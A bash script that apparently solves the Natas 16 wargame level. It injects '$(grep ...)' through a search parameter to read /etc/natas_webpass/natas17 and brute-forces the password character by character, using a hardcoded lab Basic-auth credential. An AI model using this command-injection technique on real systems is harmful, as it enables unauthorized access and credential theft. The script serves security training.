#! /bin/bash

rawurlencode() {
  local string="${1}"
  local strlen=${#string}
  local encoded=""
  local pos c o

  for (( pos=0 ; pos<strlen ; pos++ )); do
     c=${string:$pos:1}
     case "$c" in
        [-_.~a-zA-Z0-9] ) o="${c}" ;;
        * )               printf -v o '%%%02x' "'$c"
     esac
     encoded+="${o}"
  done
  echo "${encoded}"    # You can either set a return variable (FASTER)
  REPLY="${encoded}"   #+or echo the result (EASIER)... or both... :p
}

export PASSWORD

# we assume the password length is 32
for i in {0..31}
do

  # loop through all valid possible characters
  for CH in {{0..9},{a..z},{A..Z}}
  do
    PASSWORD[$i]=$CH

    GREP_BEG="$( rawurlencode '$(grep -E ^' )"
    TESTSTRING=$(printf "%s" "${PASSWORD[@]}")
    GREP_END="$( rawurlencode '.* /etc/natas_webpass/natas17)' )"

    # the last echo'ed $TESTSTRING would represent the working usr/passwd combo
    echo "PASSWORD: $TESTSTRING"

    curl --silent \
      "http://natas16.natas.labs.overthewire.org/?needle=${GREP_BEG}${TESTSTRING}${GREP_END}zebras&submit=Search" \
      -H 'Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==' \
      | grep "zebras" >/dev/null

    if [ $? -ne 0 ]; then
      # if the string "zebras" does NOT exist, that means our passwd file grep
      # returned some output which would have tainted our zebra pattern causing
      # the new pattern not to be found in "dictionary.txt" and we can move onto
      #  the next character
      break;
    fi
  done

done
